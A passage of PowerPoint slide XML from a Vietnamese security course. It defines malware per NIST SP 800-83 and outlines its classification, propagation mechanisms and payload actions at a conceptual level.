                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="114691">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14691">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1"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noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1703388" y="338138"/>
            <a:ext cx="8736012" cy="576262"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>III</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Khái niệm, phân loại</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19458" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8534400" y="6400801"/>
            <a:ext cx="2133600" cy="3206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16DD8C5B-82B7-404C-92DD-AEE9B252CC40}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>40</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B22E40D-53AE-425E-9CC2-929C09A11AA7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Mã độc (Malware – Malicious software):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>“Là m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ột chương trình được chèn vào một hệ thống, thường là bí mật, với</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ý định làm ảnh hưởng đến tính bảo mật, tính toàn vẹn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>tính </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>sẵn sàng của </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>dữ liệu, ứng dụng, hoặc hệ điều hành của nạn nhân hoặc làm phiền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>, làm gián đoạn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>nạn nhân.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t>(SP 800-83)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t>Có nhiều cách phân loại. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t> Dựa trên cách thức malware lây lan (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" i="1"/>
              <a:t>propagate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>) và hoạt động đối với mục tiêu (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" i="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200"/>
              <a:t>Các đoạn chương trình cần một chương trình chủ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="3" indent="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200"/>
              <a:t>Ví dụ: virus, logic bomb, backdoor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200"/>
              <a:t>Các chương trình độc lập</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="3" indent="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200"/>
              <a:t>Ví dụ: worm, bot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>, trojan</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN" sz="2200"/>
          </a:p>
          <a:p>
            <a:pPr lvl="3" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200"/>
              <a:t>Có khả năng tự sao chép </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>(virus, worm) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200"/>
              <a:t>hoặc không</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t> (trojan, spam email)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>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noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1703388" y="338138"/>
            <a:ext cx="8736012" cy="576262"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>III</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Khái niệm, phân loại</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19458" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8534400" y="6400801"/>
            <a:ext cx="2133600" cy="3206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16DD8C5B-82B7-404C-92DD-AEE9B252CC40}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>41</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B22E40D-53AE-425E-9CC2-929C09A11AA7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>chế</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>lan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>truyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> (propagation mechanism)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Lây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>nhiễm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thực</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dịch</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Khai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thác</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>lỗ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>phần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>mềm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>cục</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>bộ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> qua </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>mạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>bởi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> worms </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> drive-by-downloads </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>để</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>sao</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>chép</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> social engineering </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>để</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thuyết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>phục</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> ng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200" dirty="0"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ời</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dùng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> bypass </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200" dirty="0"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>chế</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>bảo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>để</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>cài</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>đặt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Trojans, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>phản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ứng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>với</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>lừa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>đảo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="-342900">
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>Hoạt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>động</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>khi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>tiếp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>cận</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>mục</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>tiêu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> (payloads action)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Phá</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hủy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dữ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>liệu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Đánh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>cắp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dịch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>vụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>để</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>biến</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
